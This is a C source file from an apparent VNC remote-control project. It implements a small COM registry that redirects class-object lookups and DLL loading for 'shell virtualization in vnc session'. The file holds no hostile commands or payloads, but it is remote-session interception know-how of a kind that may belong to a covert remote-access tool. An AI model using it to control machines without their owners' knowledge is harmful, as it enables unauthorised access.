//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
// VNC project. Version 1.9.17.3
//	
// module: mincom.c
// $Revision: 148 $
// $Date: 2014-01-29 14:13:12 +0400 (Wed, 29 Jan 2014) $
// description: 
//	small subsystem for routing some COM interfaces to the local application
//	required for shell virtualization in vnc session

#define INITGUID
#define COBJMACROS

#include "project.h"
#include <Unknwn.h>
#include "minicom.h"

typedef struct _COM_OBJECT
{
	LIST_ENTRY qLink;

	CLSID clsid;
	IUnknown *pUnk;
	DWORD dwClsContext;
	DWORD flags;
	DWORD dwRegister;
}COM_OBJECT,*PCOM_OBJECT;

static LIST_ENTRY g_ComObjects = {&g_ComObjects,&g_ComObjects};
static CRITICAL_SECTION g_ComLock;
static LONG g_ComID = 1;
static LONG g_ComInit = 0;

//HKEY_LOCAL_MACHINE\SOFTWARE\Classes\CLSID\{c71c41f1-ddad-42dc-a8fc-f5bfc61df957}

HMODULE ComGetObjectDll(REFCLSID rclsid,LPBOOL bLoaded)
{
	WCHAR szKeyName[GUID_STR_LENGTH+1];
	LPWSTR szDllName = NULL;
	ULONG DllNameLength = 0;
	HKEY hKey = NULL;
	HKEY hKey2 = NULL;
	DWORD Error;
	HMODULE hModule = NULL;

	Error = RegOpenKeyExW(HKEY_LOCAL_MACHINE,L"SOFTWARE\\Classes\\CLSID",0,KEY_READ,&hKey);
	if ( Error == NO_ERROR )
	{
		wsprintfW(
			szKeyName,
			L"{%08X-%04X-%04X-%04X-%08X%04X}",
			rclsid->Data1,
			rclsid->Data2,
			rclsid->Data3, 
			htons(*(USHORT*)&rclsid->Data4[0]),
			htonl(*(ULONG*)&rclsid->Data4[2]),
			htons(*(USHORT*)&rclsid->Data4[6])
		);
		Error = RegOpenKeyExW(hKey,szKeyName,0,KEY_READ,&hKey2);
		if ( Error == NO_ERROR )
		{
			Error = RegReadStringW(hKey2,L"InprocServer32",NULL,&szDllName,&DllNameLength);
			if ( Error == NO_ERROR )
			{
				if ( !szDllName ){
					Error = ERROR_FILE_NOT_FOUND;
				}else{
					hModule = GetModuleHandleW(szDllName);
					if ( hModule == NULL ){
						hModule = LoadLibraryW(szDllName);
						if ( !hModule ){
							Error = GetLastError();
							DbgPrint("LoadLibraryW(%S) failed, err=%u\n",szDllName,Error);
						}else{
							*bLoaded = TRUE;
						}
					}else{
						*bLoaded = FALSE;
					}
				}
			}else{
				DbgPrint("RegReadStringW failed, err=%u\n",Error);
			}
			if ( szDllName ){
				hFree ( szDllName );
			}
		}
	}

	if ( hKey ){
		RegCloseKey( hKey );
	}
	if ( hKey2 ){
		RegCloseKey( hKey2 );
	}
	if ( Error != NO_ERROR ){
		SetLastError(Error);
	}
	return hModule;
}

static PCOM_OBJECT ComFindObject(REFCLSID rclsid)
{
	PLIST_ENTRY l;
	PCOM_OBJECT Object = NULL;

	for ( l = g_ComObjects.Flink; l != &g_ComObjects; l = l->Flink )
	{
		Object = CONTAINING_RECORD(l,COM_OBJECT,qLink);
		if ( IsEqualGUID(&Object->clsid,rclsid) ){
			break;
		}
		Object = NULL;
	}
	return Object;
}

static PCOM_OBJECT ComFindRegObject(DWORD Reg)
{
	PLIST_ENTRY l;
	PCOM_OBJECT Object = NULL;

	for ( l = g_ComObjects.Flink; l != &g_ComObjects; l = l->Flink )
	{
		Object = CONTAINING_RECORD(l,COM_OBJECT,qLink);
		if ( Object->dwRegister == Reg ){
			break;
		}
		Object = NULL;
	}
	return Object;
}


HRESULT 
	ComRegisterClassObject(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		IUnknown * pUnk,
		DWORD dwClsContext,
		DWORD flags,
		LPDWORD  lpdwRegister
		)
{
	HRESULT hr = S_OK;
	PCOM_OBJECT Object;
	LONG RegID = 0;

	if ( !g_ComInit ){
		return RPC_E_THREAD_NOT_INIT;
	}

	if ( rclsid == NULL || pUnk == NULL )
	{
		return E_INVALIDARG;
	}

	EnterCriticalSection(&g_ComLock);
	
	Object = ComFindObject(rclsid);
	if ( Object == NULL )
	{
		// allocate and register new object
		Object = (PCOM_OBJECT)hAlloc(sizeof(COM_OBJECT));
		if ( Object )
		{
			RegID = InterlockedIncrement(&g_ComID);
			Object->clsid = *rclsid;
			Object->pUnk  = pUnk;
			Object->dwClsContext = dwClsContext;
			Object->flags = flags;
			Object->dwRegister = (DWORD)RegID;
			if ( lpdwRegister ){
				*lpdwRegister = (DWORD)RegID;
			}
			IUnknown_AddRef(pUnk);
			InsertTailList(&g_ComObjects,&Object->qLink);
		}
		else
		{
			hr = E_OUTOFMEMORY;
		}
	}
	else
	{
		hr = CO_E_OBJISREG;
	}
	LeaveCriticalSection(&g_ComLock);

	return hr;
}

HRESULT ComRevokeClassObject(PVIRTUAL_OBJECT VirtObject,DWORD dwRegister)
{
	HRESULT hr = S_OK;
	PCOM_OBJECT Object;

	if ( !g_ComInit ){
		return RPC_E_THREAD_NOT_INIT;
	}

	EnterCriticalSection(&g_ComLock);

	Object = ComFindRegObject(dwRegister);
	if ( Object )
	{
		IUnknown * pUnk;
		RemoveEntryList(&Object->qLink);
		pUnk = Object->pUnk;
		hFree ( Object );
		//deref object
		IUnknown_Release(pUnk);
	}
	else
	{
		hr = CO_E_OBJNOTREG;
	}
	LeaveCriticalSection(&g_ComLock);

	return hr;
}

HRESULT 
	ComGetClassObject(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		DWORD dwClsContext,
		COSERVERINFO * pServerInfo,
		REFIID riid,
		LPVOID * ppv
		)
{
	HRESULT hr = S_OK;
	PCOM_OBJECT Object;

	HMODULE hModule;
	BOOL bLoaded = FALSE;
	LPFNGETCLASSOBJECT DllGetClassObjectPtr = NULL;

	if ( !g_ComInit ){
		return RPC_E_THREAD_NOT_INIT;
	}

	if ( rclsid == NULL || ppv == NULL )
	{
		return E_INVALIDARG;
	}

	if ( VirtObject->Flags & VO_DISABLED ){
		return REGDB_E_CLASSNOTREG;
	}

	if ( VirtObject->Flags & VO_INAPP_SERVER ){

		EnterCriticalSection(&g_ComLock);
		Object = ComFindObject(rclsid);
		LeaveCriticalSection(&g_ComLock);

		if ( Object == NULL ){
			return REGDB_E_CLASSNOTREG;
		}
	}

	hModule = ComGetObjectDll(rclsid,&bLoaded);
	if ( !hModule ){
		hModule = GetModuleHandleW(VirtObject->DllName);
		if ( !hModule ){
			hModule = LoadLibraryW(VirtObject->DllName);
		}
	}
	if ( hModule )
	{
		DllGetClassObjectPtr = 
			(LPFNGETCLASSOBJECT)GetProcAddress(hModule,"DllGetClassObject");
		if ( DllGetClassObjectPtr ){
			hr = DllGetClassObjectPtr(rclsid,riid,ppv);
		}
		else
		{
			hr = CO_E_ERRORINDLL;
		}
		if ( bLoaded ){
			//FreeLibrary(hModule);
		}
	}
	else
	{
		hr = CO_E_DLLNOTFOUND;
	}
	return hr;
}

HRESULT 
	ComCreateInstance(
		PVIRTUAL_OBJECT VirtObject,
		REFCLSID rclsid,
		LPUNKNOWN pUnkOuter,
		DWORD dwClsContext,
		REFIID riid,
		LPVOID * ppv
		)
{
	HRESULT hr = S_OK;
	PCOM_OBJECT Object;
	HMODULE hModule;
	BOOL bLoaded = FALSE;
	LPFNGETCLASSOBJECT DllGetClassObjectPtr = NULL;
	IClassFactory *pICF = NULL;

	if ( !g_ComInit ){
		return RPC_E_THREAD_NOT_INIT;
	}

	if ( rclsid == NULL || ppv == NULL ){
		return E_INVALIDARG;
	}

	if ( VirtObject->Flags & VO_DISABLED ){
		return REGDB_E_CLASSNOTREG;
	}

	EnterCriticalSection(&g_ComLock);
	Object = ComFindObject(rclsid);
	LeaveCriticalSection(&g_ComLock);

	if ( VirtObject->Flags & VO_INAPP_SERVER ){
		if ( Object == NULL ){
			return REGDB_E_CLASSNOTREG;
		}
	}

	if ( Object )
	{
		IUnknown *pUNK = Object->pUnk;
		if ( !riid || IsEqualGUID(riid,&IID_IClassFactory) ){
			hr = IUnknown_QueryInterface(pUNK,riid,ppv);
		}else{
			hr = IUnknown_QueryInterface(pUNK,&IID_IClassFactory,&pICF);
			if ( hr == S_OK ){
				hr = IClassFactory_CreateInstance(pICF,pUnkOuter,riid,ppv);
				IClassFactory_Release(pICF);
			}
		}		
	}
	else
	{
		hModule = ComGetObjectDll(rclsid,&bLoaded);
		if ( !hModule ){
			hModule = GetModuleHandleW(VirtObject->DllName);
			if ( !hModule ){
				hModule = LoadLibraryW(VirtObject->DllName);
				if ( hModule ){
					bLoaded = TRUE;
				}
			}
		}
		if ( hModule )
		{
			DllGetClassObjectPtr = 
				(LPFNGETCLASSOBJECT)GetProcAddress(hModule,"DllGetClassObject");
			if ( DllGetClassObjectPtr ){
				if ( !riid || IsEqualGUID(riid,&IID_IClassFactory) ){
					hr = DllGetClassObjectPtr(rclsid,riid,ppv);
				}else{
					hr = DllGetClassObjectPtr(rclsid,&IID_IClassFactory,&pICF);
					if ( hr == S_OK ){
						hr = IClassFactory_CreateInstance(pICF,pUnkOuter,riid,ppv);
						IClassFactory_Release(pICF);
					}
				}
			}else{
				hr = CO_E_ERRORINDLL;
				if ( bLoaded ){
					FreeLibrary(hModule);
				}
			}
		}
		else
		{
			hr = CO_E_DLLNOTFOUND;
		}
	}
	return hr;
}

VOID ComInitialize(VOID)
{
	if ( InterlockedIncrement(&g_ComInit) == 1 ){
		InitializeCriticalSection(&g_ComLock);
		InitializeListHead(&g_ComObjects);
	}
}

VOID ComRelease(VOID)
{
	if ( InterlockedDecrement(&g_ComInit) == 0 ){
		EnterCriticalSection(&g_ComLock);
		while ( !IsListEmpty(&g_ComObjects) )
		{
			PCOM_OBJECT Obj;
			PLIST_ENTRY l = RemoveHeadList(&g_ComObjects);
			Obj = CONTAINING_RECORD(l,COM_OBJECT,qLink);
			if ( Obj->pUnk ){
				IUnknown_Release(Obj->pUnk);
			}
			hFree( Obj );
		}
		LeaveCriticalSection(&g_ComLock);

		InitializeCriticalSection(&g_ComLock);
		InitializeListHead(&g_ComObjects);
	}
}